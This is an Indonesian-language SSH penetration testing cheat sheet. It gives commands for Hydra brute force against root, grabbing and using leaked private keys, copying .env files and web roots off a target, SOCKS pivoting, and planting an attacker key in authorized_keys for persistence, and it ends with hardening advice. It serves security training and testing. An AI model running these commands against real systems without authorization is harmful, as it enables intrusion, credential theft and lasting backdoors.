# SSH Penetration Testing & Command Cheat Sheet

> **Tujuan:** Panduan lengkap enumerasi, autentikasi, transfer berkas, SSH tunneling (pivoting), dan eksploitasi SSH service dalam pengujian penetrasi (Penetration Testing).
> **Tools utama:** `ssh`, `scp`, `sftp`, `ssh-keygen`, `nmap`, `hydra`

---

## Penjelasan Singkat

| Item | Detail |
|------|--------|
| **Default Port** | `22/tcp` |
| **Config Server** | `/etc/ssh/sshd_config` |
| **Config Client** | `~/.ssh/config`, `/etc/ssh/ssh_config` |
| **Berkas Kunci SSH** | Private Key: `~/.ssh/id_rsa`, `~/.ssh/id_ed25519`<br>Public Key: `~/.ssh/id_rsa.pub`<br>Authorized Keys: `~/.ssh/authorized_keys` |

---

## Langkah 1: Reconnaissance & Enumeration

### 1. Nmap Scan & Enumeration Script

```bash
# Scan port 22 & deteksi versi SSH server
nmap -p 22 -sV <TARGET>

# Jalankan skrip NSE enumerasi SSH bawaan Nmap
nmap -p 22 --script ssh-auth-methods,ssh-hostkey,ssh2-enum-algos <TARGET>
```

---

### 2. Brute Force Password & Username dengan Hydra

```bash
# Brute force login SSH dengan username root
hydra -l root -P /usr/share/wordlists/rockyou.txt <TARGET> ssh

# Brute force dengan daftar username dan password terpisah
hydra -L users.txt -P passwords.txt <TARGET> ssh -t 4
```

---

## Langkah 2: Koneksi & Autentikasi SSH

### 1. Login SSH Standar (Password Authentication)

```bash
# Login SSH dengan port default (22)
ssh username@<TARGET>

# Login SSH dengan port kustom (misal port 2222)
ssh username@<TARGET> -p 2222
```

---

### 2. Login SSH Menggunakan Private Key (`id_rsa` / `id_ed25519`)

*Wajib mengubah hak akses berkas private key menjadi `600` agar SSH client tidak menolak kunci tersebut (`Permissions 0644 for 'id_rsa' are too open`).*

#### A. Mengunduh Private Key dari Target (Menggunakan `wget` / `curl`)

Jika private key ditemukan pada web server atau dibocorkan via LFI/File Disclosure:

```bash
# Unduh kunci private key via wget
wget http://<TARGET>/id_rsa -O id_rsa

# Atau unduh via curl
curl -s http://<TARGET>/id_rsa -o id_rsa

# UBAH PERMISSION BERKAS (Wajib)
chmod 600 id_rsa
```

#### B. Melakukan Login SSH Menggunakan Private Key

```bash
# Login menggunakan private key yang telah diunduh
ssh -i id_rsa username@<TARGET>

# Login dengan private key pada port kustom (misal port 2222)
ssh -i id_rsa username@<TARGET> -p 2222
```

---

### 3. Mengatasi Error Kunci / Algoritma Lama (Legacy Ciphers & Algorithms)

Jika mengalami error seperti *`no matching host key type found`* atau *`no matching key exchange algorithm found`*:

```bash
# Mengaktifkan dukungan algoritma RSA / legacy ciphers
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -i id_rsa username@<TARGET>

# Menambahkan opsi KexAlgorithms & Ciphers untuk server tua/legacy
ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 -o Ciphers=+aes128-cbc -i id_rsa username@<TARGET>
```

---

### 4. Eksekusi Perintah Sistem Langsung (Non-interactive Execution)

```bash
# Eksekusi perintah tunggal tanpa masuk ke shell interaktif
ssh username@<TARGET> "id; whoami; uname -a"

# Menjalankan skrip lokal di server remote
ssh username@<TARGET> 'bash -s' < local_script.sh
```

---

## Langkah 3: Transfer Berkas (SCP & SFTP)

### 1. Mengunggah Berkas ke Remote Server (Local -> Remote)

```bash
# Upload file tunggal ke direktori /tmp remote
scp -P 22 local_file.txt username@<TARGET>:/tmp/

# Upload file menggunakan SSH Private Key
scp -i id_rsa local_file.txt username@<TARGET>:/tmp/

# Upload seluruh folder/direktori secara rekursif (-r)
scp -i id_rsa -r ./my_folder username@<TARGET>:/tmp/
```

---

### 2. Mengunduh Berkas dari Remote Server (Remote -> Local)

```bash
# Download file sensitif (misal file .env) dari remote ke folder lokal saat ini
scp -i id_rsa username@<TARGET>:/var/www/html/.env ./

# Download seluruh direktori web dari remote ke lokal
scp -i id_rsa -r username@<TARGET>:/var/www/html ./backup_web
```

---

## Langkah 4: SSH Tunneling & Port Forwarding (Pivoting)

### 1. Local Port Forwarding (`-L`)

*Meneruskan port dari jaringan internal target ke mesin lokal attacker.*

```bash
# Meneruskan service internal target (127.0.0.1:8080) ke port lokal 9000
ssh -L 9000:127.0.0.1:8080 username@<TARGET> -i id_rsa -N

# Setelah aktif, akses di browser/lokal attacker: http://127.0.0.1:9000
```

---

### 2. Dynamic Port Forwarding / SOCKS5 Proxy (`-D`)

*Membuat SOCKS5 Proxy untuk routing seluruh trafik (pivoting) via Proxychains.*

```bash
# Buat SOCKS5 proxy di port lokal 1080
ssh -D 1080 username@<TARGET> -i id_rsa -N

# Gunakan dengan proxychains pada /etc/proxychains4.conf (socks5 127.0.0.1 1080)
proxychains nmap -sT -pn 192.168.1.0/24
```

---

### 3. Remote Port Forwarding (`-R`)

*Meneruskan port lokal attacker ke server remote (berguna untuk reverse shell).*

```bash
# Expose port lokal 8080 ke port 8888 pada remote server
ssh -R 8888:127.0.0.1:8080 username@<TARGET> -i id_rsa -N
```

---

## Langkah 5: Post-Exploitation & Persistence (SSH Key Backdoor)

### 1. Membaca & Ekstraksi SSH Private Key Target

```bash
# Cek file kunci SSH di server target
cat ~/.ssh/id_rsa
cat ~/.ssh/id_ed25519
cat /home/*/.ssh/id_rsa
```

---

### 2. Menambahkan SSH Public Key Attacker untuk Akses Persistent

```bash
# 1. Generate SSH keypair di mesin attacker (jika belum ada)
ssh-keygen -t rsa -b 4096 -f attacker_key

# 2. Masukkan isi attacker_key.pub ke berkas authorized_keys di target
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ..." >> ~/.ssh/authorized_keys

# 3. Pastikan izin akses folder dan file tepat
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys

# 4. Login kapan saja tanpa password menggunakan attacker_key
ssh -i attacker_key target_user@<TARGET>
```

---

## Catatan Penting & Pengerasan Keamanan (Hardening)

- **Matikan Login Root**: Setel `PermitRootLogin no` pada `/etc/ssh/sshd_config`.
- **Nonaktifkan Login Password**: Gunakan autentikasi berbasis SSH Key saja dengan menyetel `PasswordAuthentication no`.
- **Ganti Port Default**: Ubah port `22` ke port non-standar (misal `22222`).
- **Izin Akses Berkas Kunci**: Pastikan direktori `~/.ssh` berizin `700` dan file `authorized_keys` berizin `600`.
- **Gunakan Fail2ban**: Pasang fail2ban untuk memblokir otomatis IP yang gagal login berkali-kali (brute force mitigation).

---

## Checklist Penetration Testing SSH

- [ ] Port `22` diperiksa status dan versinya via Nmap
- [ ] Cek dukungan algoritma & autentikasi via skrip NSE Nmap
- [ ] Uji login password lemah / default via Hydra
- [ ] Ekstraksi SSH Private Key dari berkas sensitif atau backup
- [ ] Setel `chmod 600` pada private key sebelum melakukan koneksi
- [ ] Uji SSH Tunneling / Port Forwarding (`-L`, `-D`) untuk pivoting internal
- [ ] Periksa izin berkas `~/.ssh/authorized_keys` untuk persisten
- [ ] Dokumentasikan temuan dan langkah perbaikan
